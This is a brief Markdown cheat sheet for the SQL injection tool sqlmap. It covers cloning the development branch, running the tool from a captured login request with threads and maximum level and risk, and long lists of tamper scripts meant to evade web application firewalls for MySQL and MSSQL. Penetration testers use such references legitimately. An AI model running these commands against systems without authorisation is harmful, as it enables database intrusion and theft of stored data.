# SQL Map cheat sheet for the wicked 

## SQLMap Optimization 

### Clone from dev for bleeding edge:
`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`

### Run SQLMap via a file 
```python sqlmap-dev/sqlmap.py -r login-request.txt```

### Run from file with threads:
```python sqlmap-dev/sqlmap.py -r login-request.txt --threads=10```

### Run from file with threads and level:
```python sqlmap-dev/sqlmap.py -r login-request.txt --level=5 --risk=3```

## Tamper all the things:

### General Tamper Testing:
```tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes```

### MSSQL Tamper Testing: 
```tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes```

### MySQL Tamper Testing:
```tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor```


